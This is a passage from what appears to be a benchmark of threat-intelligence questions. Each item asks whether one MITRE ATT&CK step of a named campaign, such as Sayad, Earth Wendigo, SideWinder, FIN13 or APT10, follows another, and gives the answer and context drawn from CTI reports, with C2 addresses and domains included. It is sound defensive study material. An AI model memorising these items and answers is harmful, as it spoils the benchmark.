Resource Development: The Sayad malware is a self-contained executable that embeds all required malicious components, meaning it does not need to download additional content from a C2 server, which could be suspicious. This suggests that the attackers have developed and staged their capabilities in advance.
Initial Access: Sayad malware gains initial access through phishing emails, which trick users into downloading and executing the malicious executable.
Execution: The Sayad malware executes by first running a self-extracting executable (WEXTRACT.exe) that drops and launches the Binder executable malware. The Binder then checks the .NET version installed on the machine and drops the information stealer DLL component, Sayad (aka Client)  - DiagnosticsService.dll.
Persistence: The Sayad malware ensures persistence by modifying the registry to run at startup using rundll32.exe, which loads the Client (DiagnosticsService.dll).
Defense Evasion: Sayad uses an oversimplified form of obfuscation for strings utilizing Base64 encoding, which can be easily de-obfuscated. It also uses non-traditional methods for native to .NET interop, like exporting a managed API through the native Export Address Table, to evade detection.
Credential Access: Sayad is designed to steal sensitive information, including credentials for FTP clients (FileZilla and WinSCP), VPN client user configuration files, and RDP and Putty accounts.
Collection: Sayad collects various types of data, including keystrokes, clipboard contents, browser bookmarks and cookies, chat history, and VPN-related account information. It also captures screenshots and collects data from removable media.
Command and Control: The Sayad malware communicates with a C2 server located at the IP address 107.6.182.179 to upload collected data. The data is encrypted using an RSA public key before being uploaded.
Exfiltration: The Sayad malware uploads the collected and encrypted data to a malicious web server using the URL hxxp://0o0o0o0o0.com/soft.php.
Others: The Sayad malware is linked to the Iranian hacking group Ajax Security Team. The detection rate for the Sayad malware binary at VirusTotal is zero, indicating that it may not be widely recognized by antivirus solutions. The malware uses a .NET OOP/OOD background and is unique in its implementation. The malicious server is located in the Netherlands, and the domain was registered with email addresses associated with microsofts.com, which raises questions about the legitimacy of the registration.",Yes,Sayad_Flying_Kitten_analysis
1774,321,321-Credential Access-T1555-Credentials from Password Stores,"After ensuring persistence by modifying the registry to run at startup using rundll32.exe with the Client (DiagnosticsService.dll), is Sayad likely to perform discovery to collect host and application data before stealing credentials for FTP clients, VPN client user configuration files, and RDP and Putty accounts?","Credential Access: Sayad is designed to steal sensitive information, including credentials for FTP clients (FileZilla and WinSCP), VPN client user configuration files, and RDP and Putty accounts.","Reconnaissance: The Sayad malware, also known as Flying Kitten, is distributed through phishing emails, indicating a form of reconnaissance where the attackers gather email addresses and possibly other information to target specific individuals or organizations.
Resource Development: The Sayad malware is a self-contained executable that embeds all required malicious components, meaning it does not need to download additional content from a C2 server, which could be suspicious. This suggests that the attackers have developed and staged their capabilities in advance.
Initial Access: Sayad malware gains initial access through phishing emails, which trick users into downloading and executing the malicious executable.
Execution: The Sayad malware executes by first running a self-extracting executable (WEXTRACT.exe) that drops and launches the Binder executable malware. The Binder then checks the .NET version installed on the machine and drops the information stealer DLL component, Sayad (aka Client)  - DiagnosticsService.dll.
Persistence: The Sayad malware ensures persistence by modifying the registry to run at startup using rundll32.exe, which loads the Client (DiagnosticsService.dll).
Defense Evasion: Sayad uses an oversimplified form of obfuscation for strings utilizing Base64 encoding, which can be easily de-obfuscated. It also uses non-traditional methods for native to .NET interop, like exporting a managed API through the native Export Address Table, to evade detection.
Discovery: Sayad collects a wide range of information from the compromised host, including system information, running processes, open ports, and registered proxies. It also gathers data from browsers, messengers, and other applications to discover the environment it has compromised.
Collection: Sayad collects various types of data, including keystrokes, clipboard contents, browser bookmarks and cookies, chat history, and VPN-related account information. It also captures screenshots and collects data from removable media.
Command and Control: The Sayad malware communicates with a C2 server located at the IP address 107.6.182.179 to upload collected data. The data is encrypted using an RSA public key before being uploaded.
Exfiltration: The Sayad malware uploads the collected and encrypted data to a malicious web server using the URL hxxp://0o0o0o0o0.com/soft.php.
Others: The Sayad malware is linked to the Iranian hacking group Ajax Security Team. The detection rate for the Sayad malware binary at VirusTotal is zero, indicating that it may not be widely recognized by antivirus solutions. The malware uses a .NET OOP/OOD background and is unique in its implementation. The malicious server is located in the Netherlands, and the domain was registered with email addresses associated with microsofts.com, which raises questions about the legitimacy of the registration.",Yes,Sayad_Flying_Kitten_analysis
1814,327,327-Defense Evasion-T1027-Obfuscated Files or Information,"After maintaining persistence by injecting malicious code into the webmail system's shortcut feature and registering malicious JavaScript to the Service Worker script, is it likely that Earth Wendigo would evade detection by hiding malicious code inside CSS elements and leveraging the webmail system's search suggestion function for script execution?",Defense Evasion: Earth Wendigo evaded detection by hiding malicious code inside CSS elements and leveraging the webmail system's search suggestion function to execute their script indirectly. They also manipulated email signatures and used Service Worker scripts to intercept and manipulate HTTPS requests.,"Initial Access: The Earth Wendigo campaign initiated their attack with spear-phishing emails containing obfuscated JavaScript. When victims opened the email on their webmail page, the JavaScript would load malicious scripts from a remote server to steal browser cookies and webmail session keys, append malicious scripts to email signatures for propagation, and exploit XSS vulnerabilities in the webmail system.
Execution: The malicious scripts executed by Earth Wendigo included cookie stealers and scripts that manipulated webmail session keys and browser cookies. Additionally, they exploited a webmail system's XSS vulnerability to inject malicious JavaScript permanently and registered a malicious JavaScript code to the Service Worker feature in web browsers.
Persistence: To maintain their foothold, Earth Wendigo used two methods: exploiting an XSS vulnerability in the webmail system's shortcut feature to inject malicious code, and registering a malicious JavaScript to the Service Worker script in the browser.
Credential Access: The Service Worker script used by Earth Wendigo intercepted HTTPS POST requests to the webmail login API to steal username and password pairs, which were then sent to a remote server.
Command and Control: Earth Wendigo established a WebSocket connection between the victims' browsers and their WebSocket server to control the JavaScript backdoor and instruct it to read and exfiltrate emails from the webmail server.
Exfiltration: The JavaScript backdoor created by Earth Wendigo facilitated the exfiltration of mailbox content and attachments via a WebSocket connection to their server. The backdoor executed commands to collect and send email data back to the WebSocket server.
Others: Additional findings include the discovery of multiple malware variants used by Earth Wendigo, written in Python and compiled as Windows executables. These variants communicated with the same malicious domain used in the webmail server attacks and included shellcode loaders and backdoors. However, the specific code delivered by the command and control server could not be verified as the server was down during investigation.",Yes,trendmicro.com-Earth Wendigo Injects JavaScript Backdoor for Mailbox Exfiltration
1817,327,327-Command and Control-T1071-Application Layer Protocol,"Before establishing a WebSocket connection to the victims' browsers for command and control of the JavaScript backdoor and instructing it to read and exfiltrate emails, is Earth Wendigo likely to have stolen username and password pairs from intercepted HTTPS POST requests through a Service Worker script?",Command and Control: Earth Wendigo established a WebSocket connection between the victims' browsers and their WebSocket server to control the JavaScript backdoor and instruct it to read and exfiltrate emails from the webmail server.,"Initial Access: The Earth Wendigo campaign initiated their attack with spear-phishing emails containing obfuscated JavaScript. When victims opened the email on their webmail page, the JavaScript would load malicious scripts from a remote server to steal browser cookies and webmail session keys, append malicious scripts to email signatures for propagation, and exploit XSS vulnerabilities in the webmail system.
Execution: The malicious scripts executed by Earth Wendigo included cookie stealers and scripts that manipulated webmail session keys and browser cookies. Additionally, they exploited a webmail system's XSS vulnerability to inject malicious JavaScript permanently and registered a malicious JavaScript code to the Service Worker feature in web browsers.
Persistence: To maintain their foothold, Earth Wendigo used two methods: exploiting an XSS vulnerability in the webmail system's shortcut feature to inject malicious code, and registering a malicious JavaScript to the Service Worker script in the browser.
Defense Evasion: Earth Wendigo evaded detection by hiding malicious code inside CSS elements and leveraging the webmail system's search suggestion function to execute their script indirectly. They also manipulated email signatures and used Service Worker scripts to intercept and manipulate HTTPS requests.
Credential Access: The Service Worker script used by Earth Wendigo intercepted HTTPS POST requests to the webmail login API to steal username and password pairs, which were then sent to a remote server.
Exfiltration: The JavaScript backdoor created by Earth Wendigo facilitated the exfiltration of mailbox content and attachments via a WebSocket connection to their server. The backdoor executed commands to collect and send email data back to the WebSocket server.
Others: Additional findings include the discovery of multiple malware variants used by Earth Wendigo, written in Python and compiled as Windows executables. These variants communicated with the same malicious domain used in the webmail server attacks and included shellcode loaders and backdoors. However, the specific code delivered by the command and control server could not be verified as the server was down during investigation.",Yes,trendmicro.com-Earth Wendigo Injects JavaScript Backdoor for Mailbox Exfiltration
1822,328,328-Command and Control-T1071-Application Layer Protocol,"After AURORA PANDA leverages exploit code for CVE-2014-0322 to infect victims with ZxShell malware during initial access through a strategic web compromise (SWC) on a U.S. organization’s website, is it likely that victim exploitation will use Sakula malware to communicate with a command-and-control (C2) infrastructure at oa[.]ameteksen[.]com for command and control?","Command and Control: Victim exploitation occurred in the same manner as in the VFW activity, but the payload was different. Instead of ZxShell malware connecting to AURORA PANDA-related infrastructure, it was a malware variant known as Sakula connecting to command-and-control (C2) infrastructure at oa[.]ameteksen[.]com.","Initial Access: Two weeks ago, news broke about strategic web compromise (SWC) activity on the website for the U.S. organization, Veterans of Foreign Wars (VFW). This activity leveraged exploit code for a zero-day vulnerability now identified as CVE-2014-0322 and ultimately infected victims with ZxShell malware. CrowdStrike Intelligence attributed this attack to the AURORA PANDA adversary; however, the discovery of additional indicators revealed that another adversary was leveraging the same vulnerability to carry out targeted attacks nearly a month before the VFW attack occurred. This other activity appears to be focused on French aerospace and shares similarities with a 2012 SWC campaign affecting the website of U.S.-based turbine manufacturer, Capstone Turbine.
Others: CrowdStrike Intelligence became aware of this additional activity after learning of a malicious iframe located at savmpet[.]com. The iframe redirected visitors to gifas[.]assso[.]net, which was hosting exploit code in two files (include.html and Tope.swf) as well as a malicious payload (Erido.jpg). The content of the page was taken from the website of the French aerospace industries association, Groupement des industries franaises aronautiques et spatiales (GIFAS). The 17 January 2014 date on both the webpage and the page source shows that it was created nearly a month before the VFW attack occurred. First is the IP address 173.252.252.204, which hosted both savmpet[.]com and gifas[.]assso[.]net. Several other domains were also pointed at this IP during the same timeframe, including two that contained the same content and malicious iframe as savmpet[.]com, secure[.]safran-group[.]com, and icbcqsz[.]com. Of particular interest was secure[.]safran-group[.]com. Safran is a France-based aerospace and defense company with a focus on the design and production of aircraft engines and equipment. The company owns the safran-group[.]com domain, and the fact that one of its subdomains was pointed at a malicious IP address suggests that the adversary compromised Safran's DNS. The Sakula malware used in this attack contained an unusual and interesting component that further indicates a focus on French aerospace. As part of the infection process, it added a number of domains to the ""host's"" file of victim machines. The snecma[.]fr domain belongs to the Safran subsidiary, Snecma, that designs and builds engines for civilian and military aircraft, and spacecraft. The domains listed appear to provide remote access to the company's employees and possibly third-party contractors. The purpose of this component is unclear. It does not map these domains to malicious IP addresses because the 217.108.170.0/24 range belongs to the company, which means it is not meant to send victims directly to adversary infrastructure for credential collection. One possibility is that it was meant to make the malware appear more legitimate. It has also been hypothesized that this was done to ensure DNS connectivity to these particular domains; however, it seems unlikely that victims would suffer significant DNS connectivity issues, which means that adding this component to the malware for that purpose would be somewhat superfluous. It should be noted that no victim logs related to this attack were discovered, so it is unclear who the actual targets and victims were. Having the secure[.]safran-group[.]com domain pointed at a malicious IP indicates that Safran suffered a DNS compromise, but no deeper network compromise was observed. It is possible that the adversary desired to target the French aerospace and defense sectors broadly, or possibly organizations in these sectors globally. In January 2013, it was reported that the website for U.S.-based turbine manufacturer, Capstone Turbine, had been compromised and was being used in a SWC attack leveraging an exploit for the CVE-2012-4792. There are three primary similarities between the Capstone Turbine attack and the recent French aerospace activity. The first, and most significant, connection is the use of Sakula malware. In both campaigns, Sakula variants were installed on successfully exploited machines. In Capstone Turbine, the Sakula sample used (MD5 hash: 61fe6f4cb2c54511f0804b1417ab3bd2) connected to web[.]vipreclod[.]com, and in the recent attack, the sample (MD5 hash: c869c75ed1998294af3c676bdbd56851) connected to oa[.]ameteksen[.]com. Use of this malware doesn't appear to be widespread, but it is not yet clear whether only one group uses it, and therefore its use alone does not necessarily indicate a particular adversary. Another similarity is that GIFAS-based malicious domains are related to each incident. In the more recent attack, the gifas[.]assso[.]net domain was used to host exploit code and the malicious payload. The Capstone Turbine incident did not directly use a GIFAS-based domain, but a deeper look at network indicators related to those observed in the Capstone incident reveals two such domains: gifas[.]cechire[.]com and gifas[.]blogsite[.]org. The third similarity between the two is the use of zero-days. The exploit used in Capstone Turbine was a zero-day during the time it was active, just like the exploit used in the recent French aerospace activity. This is a general similarity that does not create a definitive link between the two attacks, but when viewed in conjunction with the use of the same malware and GIFAS-based domains, it strengthens the connection.",Yes,french-connection-french-aerospace-focused-cve-2014-0322-attack-shares-similarities-2012
1836,329,329-Privilege Escalation-T1548-Abuse Elevation Control Mechanism,"After the SideWinder APT group exploited CVE-2019-2215 to gain initial access via malicious apps on Google Play, is it likely that the group used exploits from the C&C server, such as CVE-2019-2215 and MediaTek-SU, to root devices for privilege escalation before employing techniques like obfuscation, encryption, and dynamic code invocation to evade detection?","Privilege Escalation: SideWinder used two methods for privilege escalation: 1) Device rooting for specific devices using exploits from the C&C server, including CVE-2019-2215 and MediaTek-SU. 2) Using accessibility permissions on typical Android phones to install the payload app callCam.","Initial Access: The SideWinder APT group exploited CVE-2019-2215, a use-after-free vulnerability in Android's Binder IPC system, to compromise devices via malicious apps on Google Play. These apps, disguised as photography and file manager tools, have been active since March 2019. The apps Camero and FileCrypt Manager acted as droppers, downloading additional DEX files from a C&C server to install the callCam app without user awareness.
Execution: The SideWinder APT group's callCam app, once installed, hides its icon and executes in the background to collect sensitive information from the device.
Defense Evasion: To evade detection, SideWinder employed obfuscation, data encryption, and dynamic code invocation. The dropper apps used an overlay screen to hide the installation and launch of the payload app from the user.
Discovery: The callCam app collected extensive information from compromised devices, including location, battery status, files, installed apps, device information, sensor data, camera information, screenshots, account details, Wi-Fi information, and data from various applications such as WeChat, Outlook, Twitter, Yahoo Mail, Facebook, Gmail, and Chrome.
Collection: The callCam app collected various types of data from the compromised devices, which was then encrypted using RSA and AES encryption algorithms before being sent to the C&C server.
Command and Control: The SideWinder group used a C&C server to communicate with the compromised devices and to download exploits and additional payload. The C&C server addresses were encoded in Base64 and configured using Apps Conversion Tracking.
Exfiltration: The callCam app encrypted the collected data using RSA and AES encryption algorithms, verified data integrity with SHA256, and customized the encoding routine before exfiltrating it to the C&C server.
Others: Trend Micro's Mobile Security for Android detects the malicious apps used by SideWinder. The Mobile Security for Enterprise suite provides additional protections. Indicators of Compromise (IoCs) include SHA256 hashes of the malicious apps and C&C server domains such as ms-ethics.net, deb-cn.net, ap1-acl.net, ms-db.net, aws-check.net, and reawk.net.",Yes,"First Active Attack Exploiting CVE-2019-2215 Found on Google Play, Linked to SideWinder APT Group"
1851,331,331-Discovery-T1082-System Information Discovery,"After using the popular .NET obfuscation tool ConfuserEx for defense evasion, is it likely that VERMIN will collect machine name, username, OS name, architecture, and local IP address during its system information discovery phase before deploying its keylogger component to collect keystrokes and clipboard data?","Discovery: The VERMIN malware collects various information from the infected machine, including machine name, username, OS name via WMI query, architecture (x64 vs x86), local IP address, and checks for installed anti-virus software via WMI query.","Initial Access: The CTI report by Tom Lancaster and Juan Cortes from Palo Alto Networks' Unit 42 details the discovery of a new malware family named VERMIN, which is a Remote Access Tool (RAT) written using the Microsoft .NET Framework. The malware was initially identified through a tweet about a sample with a Ukrainian Ministry of Defense theme. The sample was an SFX executable that displayed a decoy document before executing the malware. The hash of the file is 31a1419d9121f55859ecf2d01f07da38bd37bb11d0ed9544a35d5d69472c358e. The malware uses HTTP encapsulated SOAP for command and control, which is uncommon in malware samples. The campaign using VERMIN dates back to late 2015 and also involves the use of Quasar RAT.
Execution: The VERMIN malware, after initial execution, checks the installed input language on the system for Russian or Ukrainian. If neither is found, it attempts to exit but continues to run due to a coding error. It then decrypts an embedded resource using a brute force method to find a 6-byte array that matches a CRC32 sum, which is then hashed with MD5 to create a decryption key. The malware sets up a scheduled task to run every 30 minutes indefinitely and collects various information from the infected machine, such as machine name, username, OS name, architecture, local IP address, and installed anti-virus software. If any anti-virus is detected, the malware does not install its keylogger component.
Persistence: The VERMIN malware establishes persistence by setting itself to run as a scheduled task every 30 minutes indefinitely. The task is created with various parameters, including server IP list, path, keylogger path, mutex, username, password, task names, process names, task descriptions, and task authors. The malware saves and encrypts these parameters to a predefined location on the infected system: C:\Users\Admin\AppData\Roaming\Microsoft\AddIns\settings.dat.
Defense Evasion: The VERMIN malware uses the popular .NET obfuscation tool ConfuserEx to pack and obfuscate its code. It also checks for the presence of anti-virus software on the infected machine and refrains from installing its keylogger component if any anti-virus is detected.
Collection: The VERMIN malware includes a keylogger component that collects all keystrokes and clipboard data. The data is encrypted and stored in the folder %appdata%\Microsoft\Proof\Settings.{ED7BA470-8E54-465E-825C-99712043E01C}\Profiles\. Each file is saved with the format ""{0:dd-MM-yyyy}.txt"" and encrypted using 3-DES with a hardcoded key.
Command and Control: The VERMIN malware communicates with its command and control (C2) servers using SOAP envelopes and the WSHttpBinding() API. It sets up 'Username' authentication for communication with its C2, allowing the author easier control over the various infected hosts. An example of a defanged request/response to the C2 server is provided in the report.
Others: The CTI report concludes that the VERMIN malware is likely used in targeted attacks in Ukraine, given the limited number of samples, targeting themes, and the requirement for most of the malware's operations to have ""hands-on-keyboard"" interactions, except for keylogging. The report also mentions that Palo Alto Networks' Wildfire and Traps identify all samples mentioned as malicious, and the C2 domains used in the campaign are blocked via Threat Prevention. AutoFocus customers can track samples related to the blog via specific tags. The report includes appendices with C2 addresses, malware samples, and a Python script to decode VERMIN resources.",Yes,VERMIN_ Quasar RAT and Custom Malware Used In Ukraine
1863,334,334-Defense Evasion-T1070-Indicator Removal,"After maintaining persistence by disabling signature validation in the operating system kernel and bootloader to load infected firmware without issues after reboots, is Implant.ARM.iLOBleed.a likely to modify the firmware update process and alter admin web interface modules to evade detection before proceeding to wipe server disks as part of its impact tactics?","Defense Evasion: Implant.ARM.iLOBleed.a evades detection by simulating firmware updates and displaying fake version information in the iLO web console. It modifies the firmware update process to maintain the infected firmware and alters admin web interface modules to display invalid software version information. Additionally, it modifies server event logging modules to prevent logging of its operations.","Persistence: The report details the discovery of a rootkit named Implant.ARM.iLOBleed.a within HP iLO firmware. This rootkit is designed to maintain persistence by manipulating the iLO firmware upgrade routine, simulating version changes while preventing actual updates. The malware achieves persistence by disabling signature validation in both the operating system kernel and bootloader, allowing the infected firmware to load without issues after reboots.
Impact: The rootkit is capable of wiping server disks completely, with the ability to perform this action repeatedly at intervals. This destructive capability is part of the malware's impact tactics, designed to hide tracks and potentially disrupt operations by destroying data on the server's hard disks.
Others: The report emphasizes the importance of firmware security and the challenges posed by proprietary technologies like HP iLO, which lacks public tools and information for security analysis. It highlights the need for preventive security measures, such as updating firmware, changing admin passwords, isolating the iLO network, and periodically monitoring firmware status. The report also mentions the development of tools to dump iLO firmware and check for infections, which will be made available to the public.",Yes,Implant.ARM_.iLOBleed.a-en
1886,337,337-Discovery-T1016-System Network Configuration Discovery,"After executing lateral movement using WMI and custom web shells like BUSTEDPIPE, is it likely that FIN13 will gather information on network and host configurations before staging collected data from network shared drives for fraudulent transactions?","Discovery: FIN13 leverages native OS binaries, scripts, third-party tools, and custom malware for internal reconnaissance. They gather information on network and host configurations, user accounts, and services to support their objectives.","Reconnaissance: Mandiant has been tracking FIN13, a cybercriminal threat actor targeting Mexico since 2017, with activities dating back to 2016. FIN13 is known for long-term intrusions, mapping victim networks, capturing credentials, and stealing various sensitive documents to facilitate fraudulent money transfers. Unlike typical ransomware groups, FIN13 uses custom passive backdoors and tools for extended periods within victim environments, focusing on financial, retail, and hospitality industries.
Initial Access: FIN13 has exploited external servers to deploy web shells and custom malware, including BLUEAGAVE and SIXPACK, to establish a foothold. Specific vulnerabilities targeted are unclear due to long dwell times and insufficient evidence. However, web shells on external servers have been a consistent gateway for FIN13 into victim networks.
Execution: FIN13 employs JSPRAT for local command execution, file upload/download, and network traffic proxying. They also use passive backdoors like BLUEAGAVE, which establishes a local HTTP server on high ephemeral ports, listening for incoming HTTP requests and executing commands via cmd.exe.
Persistence: FIN13 uses various methods for persistence, including replacing legitimate KeePass binaries with trojanized versions to log passwords, and deploying malware like SIXPACK and SWEARJAR. They also use email communications for command and control with a backdoor called MAILSLOT.
Privilege Escalation: FIN13 utilizes common privilege escalation techniques, adapting to diverse victim networks. They have used utilities like ProcDump to dump LSASS process memory and Mimikatz to extract credentials. Additionally, they have employed certutil to launch obfuscated utilities and trojanized KeePass binaries for credential harvesting.
Defense Evasion: FIN13 employs defense evasion tactics such as using passive backdoors for stealth, chaining web shells for complex pivots, and leveraging legitimate utilities like certutil for detection evasion. They also use custom droppers like LATCHKEY and malware like DRAWSTRING with recon functionality.
Credential Access: FIN13 uses techniques like process memory dumping of LSASS and network sniffing to obtain credentials. They also target unsecured credentials and have used trojanized versions of KeePass to log newly entered passwords.
Lateral Movement: The group uses WMI to remotely execute commands and move laterally, employing utilities like Invoke-WMIExec and custom web shells like BUSTEDPIPE. They also use Invoke-SMBExec and NIGHTJAR for lateral movement and cross-platform operations.
Collection: FIN13 collects data from network shared drives and stages it locally or remotely. They also archive collected data using utilities and libraries, targeting specific data that aids in fraudulent transactions.
Command and Control: FIN13 uses proxies, application layer protocols, and non-application layer protocols for command and control. They also transfer tools into the environment and encode data for communication.
Exfiltration: FIN13 exfiltrates data over web services, using tools like web shells and JSP tools in web-accessible directories to steal targeted data for fraudulent transactions.
Others: FIN13's operations are characterized by a median dwell time of 913 days, which is significantly longer than typical financially motivated actors. They have a rare operational lifespan of over five years, targeting only organizations in Mexico. FIN13's endgame involves processing POS data and sending fraudulent ISO 8583 transactions. Despite the rise of ransomware, FIN13 has not deployed ransomware and remains focused on traditional cybercrime.",Yes,FIN13_ A Cybercriminal Threat Actor Focused on Mexico _ Mandiant
1892,337,337-Collection-T1560-Archive Collected Data,"After using WMI to execute commands remotely and moving laterally within victim networks using tools like BUSTEDPIPE and Invoke-SMBExec, is it likely that FIN13 will collect targeted data from network shared drives and stage it locally or remotely before archiving the collected data?","Collection: FIN13 collects data from network shared drives and stages it locally or remotely. They also archive collected data using utilities and libraries, targeting specific data that aids in fraudulent transactions.","Reconnaissance: Mandiant has been tracking FIN13, a cybercriminal threat actor targeting Mexico since 2017, with activities dating back to 2016. FIN13 is known for long-term intrusions, mapping victim networks, capturing credentials, and stealing various sensitive documents to facilitate fraudulent money transfers. Unlike typical ransomware groups, FIN13 uses custom passive backdoors and tools for extended periods within victim environments, focusing on financial, retail, and hospitality industries.
Initial Access: FIN13 has exploited external servers to deploy web shells and custom malware, including BLUEAGAVE and SIXPACK, to establish a foothold. Specific vulnerabilities targeted are unclear due to long dwell times and insufficient evidence. However, web shells on external servers have been a consistent gateway for FIN13 into victim networks.
Execution: FIN13 employs JSPRAT for local command execution, file upload/download, and network traffic proxying. They also use passive backdoors like BLUEAGAVE, which establishes a local HTTP server on high ephemeral ports, listening for incoming HTTP requests and executing commands via cmd.exe.
Persistence: FIN13 uses various methods for persistence, including replacing legitimate KeePass binaries with trojanized versions to log passwords, and deploying malware like SIXPACK and SWEARJAR. They also use email communications for command and control with a backdoor called MAILSLOT.
Privilege Escalation: FIN13 utilizes common privilege escalation techniques, adapting to diverse victim networks. They have used utilities like ProcDump to dump LSASS process memory and Mimikatz to extract credentials. Additionally, they have employed certutil to launch obfuscated utilities and trojanized KeePass binaries for credential harvesting.
Defense Evasion: FIN13 employs defense evasion tactics such as using passive backdoors for stealth, chaining web shells for complex pivots, and leveraging legitimate utilities like certutil for detection evasion. They also use custom droppers like LATCHKEY and malware like DRAWSTRING with recon functionality.
Credential Access: FIN13 uses techniques like process memory dumping of LSASS and network sniffing to obtain credentials. They also target unsecured credentials and have used trojanized versions of KeePass to log newly entered passwords.
Discovery: FIN13 leverages native OS binaries, scripts, third-party tools, and custom malware for internal reconnaissance. They gather information on network and host configurations, user accounts, and services to support their objectives.
Lateral Movement: The group uses WMI to remotely execute commands and move laterally, employing utilities like Invoke-WMIExec and custom web shells like BUSTEDPIPE. They also use Invoke-SMBExec and NIGHTJAR for lateral movement and cross-platform operations.
Command and Control: FIN13 uses proxies, application layer protocols, and non-application layer protocols for command and control. They also transfer tools into the environment and encode data for communication.
Exfiltration: FIN13 exfiltrates data over web services, using tools like web shells and JSP tools in web-accessible directories to steal targeted data for fraudulent transactions.
Others: FIN13's operations are characterized by a median dwell time of 913 days, which is significantly longer than typical financially motivated actors. They have a rare operational lifespan of over five years, targeting only organizations in Mexico. FIN13's endgame involves processing POS data and sending fraudulent ISO 8583 transactions. Despite the rise of ransomware, FIN13 has not deployed ransomware and remains focused on traditional cybercrime.",Yes,FIN13_ A Cybercriminal Threat Actor Focused on Mexico _ Mandiant
1901,339,339-Execution-T1204-User Execution,"Is it likely that Lampion's phishing emails, which mimic the Portuguese Government Finance & Tax to download a zip file containing a VBScript dropper, will facilitate execution by downloading and running 'P-19-2.dll' and '0.zip' before achieving persistence by creating a .lnk file in the Windows Startup folder?","Execution: The Lampion trojan's execution begins when the victim clicks on a link in the phishing email, which downloads a zip file containing a VBScript file. This file, once executed, downloads two additional files: 'P-19-2.dll' and '0.zip'. The 'P-19-2.dll' file is executed at system startup and invokes the second file, '0.zip', which contains a DLL with additional code for the trojan's operation.","Initial Access: The CTI report from seguranca-informatica.pt, authored by Pedro Tavares, details a phishing campaign targeting Portuguese users with emails mimicking the Portuguese Government Finance & Tax. The emails, which discuss issues related to a debt from 2018, contain links that download a zip file named 'FacturaNovembro-4492154-2019-10_8.zip' from an online server. This file, once extracted, reveals three files, one of which is a VBScript file acting as a dropper and downloader for the Lampion trojan.
Persistence: The Lampion trojan achieves persistence by creating a .lnk file in the Windows StartUp folder, which triggers the execution of the trojan every time the victim's computer starts. Additionally, a new VBS file is created to execute the trojan upon system startup.
Defense Evasion: The Lampion trojan employs anti-debug and anti-VM techniques to evade analysis. It uses VMProtect 3.x to protect its code, making manual analysis and sandbox detection difficult. The trojan also includes a large amount of junk data within its files to hinder detection by antivirus engines.
Command and Control: The Lampion trojan communicates with a C2 server to send collected data, including details from the computer's disk, opened windows, clipboard, and banking credentials. The C2 server is not detected as malicious by antivirus agents at the time of the report.
Others: The CTI report includes indicators of compromise (IOCs) such as URLs, hashes, and Yara rules for detecting the Lampion trojan. The report also mentions efforts to decommission the domains and C2 server associated with the trojan by contacting Amazon Web Services (AWS). Despite these efforts, malicious endpoints were still active at the time of the report's writing.",Yes,Targeting Portugal_ A new trojan 'Lampion' has spread using template emails from the Portuguese Government Finance & Tax
1904,339,339-Command and Control-T1071-Application Layer Protocol,"After the Lampion trojan achieves persistence by creating a .lnk file and a new VBS file to ensure execution at system startup, is it likely that the malware will communicate with a C2 server to send collected data using an application layer protocol for Command and Control purposes?","Command and Control: The Lampion trojan communicates with a C2 server to send collected data, including details from the computer's disk, opened windows, clipboard, and banking credentials. The C2 server is not detected as malicious by antivirus agents at the time of the report.","Initial Access: The CTI report from seguranca-informatica.pt, authored by Pedro Tavares, details a phishing campaign targeting Portuguese users with emails mimicking the Portuguese Government Finance & Tax. The emails, which discuss issues related to a debt from 2018, contain links that download a zip file named 'FacturaNovembro-4492154-2019-10_8.zip' from an online server. This file, once extracted, reveals three files, one of which is a VBScript file acting as a dropper and downloader for the Lampion trojan.
Execution: The Lampion trojan's execution begins when the victim clicks on a link in the phishing email, which downloads a zip file containing a VBScript file. This file, once executed, downloads two additional files: 'P-19-2.dll' and '0.zip'. The 'P-19-2.dll' file is executed at system startup and invokes the second file, '0.zip', which contains a DLL with additional code for the trojan's operation.
Persistence: The Lampion trojan achieves persistence by creating a .lnk file in the Windows StartUp folder, which triggers the execution of the trojan every time the victim's computer starts. Additionally, a new VBS file is created to execute the trojan upon system startup.
Defense Evasion: The Lampion trojan employs anti-debug and anti-VM techniques to evade analysis. It uses VMProtect 3.x to protect its code, making manual analysis and sandbox detection difficult. The trojan also includes a large amount of junk data within its files to hinder detection by antivirus engines.
Others: The CTI report includes indicators of compromise (IOCs) such as URLs, hashes, and Yara rules for detecting the Lampion trojan. The report also mentions efforts to decommission the domains and C2 server associated with the trojan by contacting Amazon Web Services (AWS). Despite these efforts, malicious endpoints were still active at the time of the report's writing.",Yes,Targeting Portugal_ A new trojan 'Lampion' has spread using template emails from the Portuguese Government Finance & Tax
1918,34,34-Exfiltration-T1048-Exfiltration Over Alternative Protocol,"After using dynamic-DNS domains for command and control and transferring data using tools like Robocopy and Putty Secure Copy Client (PSCP), is APT10 likely to push data from victim networks to other networks they have access to and then pull the data to their own C2 servers for exfiltration?","Exfiltration: APT10 'pushes' data from victim networks to other networks they have access to, such as other MSP or victim networks, then 'pulls' the data to locations from which they can directly obtain it, such as the threat actor's C2 servers.","Initial Access: APT10, a China-based threat actor, has been observed using spear phishing emails with malicious attachments or links to compromise targets. These emails often contain decoy documents relevant to the recipient's interests, indicating significant target research. For example, an official document from the Japan Society for the Promotion of Science was weaponized and used in a campaign against the Japanese education sector.
Execution: APT10 deploys malware to establish a foothold on a target network, using tools like PlugX, RedLeaves, or Quasar RAT for long-term remote access. The actor performs internal reconnaissance using common Windows tools and open-source pentesting tools. APT10 ensures access to legitimate credentials, often using the MSPs credentials, and deploys credential theft tools such as mimikatz or PwDump. The actor installs updates and new malware on compromised systems, using methods like reverse shell or RDP connections to propagate across the network.
Persistence: APT10 achieves persistence on victim networks primarily through scheduled tasks or Windows services, ensuring malware remains active despite system reboots. The actor targets both high-value systems for access and low-profile systems less likely to draw attention for long-term access.
Privilege Escalation: APT10 uses credential theft tools to gain higher-level permissions on compromised systems. The actor has been observed using stolen MSP credentials to gain administrator or domain administrator privileges.
Defense Evasion: APT10 has evolved from using malware associated with China-based threat actors to developing bespoke in-house malware like ChChes and RedLeaves. The actor also uses open-source malware like Quasar and extends its capabilities. APT10 uses DLL search order hijacking and sideloading to execute modified versions of open-source tools.
Credential Access: APT10 deploys tools like mimikatz or PwDump to steal credentials, often using DLL load order hijacking to execute against a domain controller.
Discovery: APT10 conducts internal reconnaissance to map out the network using common Windows tools and later stages using open-source pentesting tools.
Lateral Movement: APT10 leverages shared MSP infrastructure to move laterally between MSPs and other victims. The actor uses systems that share access and credentials to gain access to new areas of the network.
Collection: APT10 identifies systems of interest and stages data for exfiltration in multi-part archives, often placed in the Recycle Bin, using compression tools launched via remote command execution scripts.
